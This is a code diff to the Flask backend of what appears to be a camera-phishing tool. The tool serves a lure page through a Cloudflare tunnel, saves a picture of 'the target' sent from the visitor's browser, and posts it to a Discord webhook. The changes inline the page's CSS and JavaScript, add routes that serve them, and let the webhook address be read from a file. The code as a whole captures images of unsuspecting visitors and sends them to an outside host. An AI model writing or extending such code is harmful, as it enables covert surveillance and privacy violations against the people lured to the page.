@@ -12,12 +12,13 @@ import time
 from flaredantic import FlareTunnel, FlareConfig
 from flask import Flask, request, Response, send_from_directory
 import signal
-from utils import get_file_data, update_webhook, check_and_get_webhook_url
+from utils import get_file_data, update_webhook, check_and_get_webhook_url, DISCORD_WEBHOOK_FILE_NAME
 
 # Global flag to handle graceful shutdown
 shutdown_flag = threading.Event()
 
 HTML_FILE_NAME = "index.html"
+MODULE_DIR = None  # set in run_flask — absolute path of the active module folder
 
 if sys.stdout.isatty():
     R = '\033[31m'  # Red
@@ -47,6 +48,7 @@ def should_exclude_line(line):
     ]
     return any(pattern in line for pattern in exclude_patterns)
 
+
 @app.route("/", methods=["GET"])
 def get_website():
     html_data = ""
@@ -54,7 +56,29 @@ def get_website():
         html_data = get_file_data(HTML_FILE_NAME)
     except FileNotFoundError:
         pass
+
+    # Inject style.css inline to avoid external static file routing issues
+    try:
+        css = get_file_data(os.path.join(os.getcwd(), 'style.css'))
+        html_data = html_data.replace(
+            '<link rel="stylesheet" href="style.css" />',
+            '<style>' + css + '</style>'
+        )
+    except Exception:
+        pass
+
+    # Inject app.js inline
+    try:
+        js = get_file_data(os.path.join(os.getcwd(), 'app.js'))
+        html_data = html_data.replace(
+            '<script src="app.js"></script>',
+            '<script>' + js + '</script>'
+        )
+    except Exception:
+        pass
+
     return Response(html_data, content_type="text/html")
+
 
 @app.route("/dwebhook.js", methods=["GET"])
 def get_webhook_js():
@@ -74,7 +98,12 @@ def image():
     i.save('%s/%s' % (os.getcwd(), f))
     #print(f"{B}[+] {C}Picture of the target captured and saved")
 
-    webhook_url = check_and_get_webhook_url(os.getcwd())
+    try:
+        with open(os.path.join(os.getcwd(), "iwebhook.js"), "r") as file:
+            webhook_url = file.read().strip()
+    except FileNotFoundError:
+        webhook_url = check_and_get_webhook_url(os.getcwd())
+    
     files = {'image': open(f'{os.getcwd()}/{f}', 'rb')}
     response = requests.post(webhook_url, files=files)
 
@@ -84,10 +113,35 @@ def image():
 def get_url():
     return args.target
 
+@app.route('/style.css', methods=['GET'])
+def serve_css():
+    """Serve the module's stylesheet."""
+    if MODULE_DIR is None:
+        return Response("Server not ready", status=503)
+    try:
+        with open(os.path.join(MODULE_DIR, 'style.css'), 'r', encoding='utf-8') as f:
+            return Response(f.read(), mimetype='text/css')
+    except FileNotFoundError:
+        return Response("/* style.css not found */", status=404, mimetype='text/css')
+
+@app.route('/app.js', methods=['GET'])
+def serve_appjs():
+    """Serve the module's JavaScript."""
+    if MODULE_DIR is None:
+        return Response("Server not ready", status=503)
+    try:
+        with open(os.path.join(MODULE_DIR, 'app.js'), 'r', encoding='utf-8') as f:
+            return Response(f.read(), mimetype='application/javascript')
+    except FileNotFoundError:
+        return Response("// app.js not found", status=404, mimetype='application/javascript')
+
+
 #run_flask function to handle threading
 def run_flask(folder_name):
+    global MODULE_DIR
     try:
         os.chdir(folder_name)
+        MODULE_DIR = os.path.abspath(os.getcwd())  # store absolute path
     except FileNotFoundError:
         print(f"{R}Error: Folder '{folder_name}' does not exist.{W}")
         sys.exit(1)
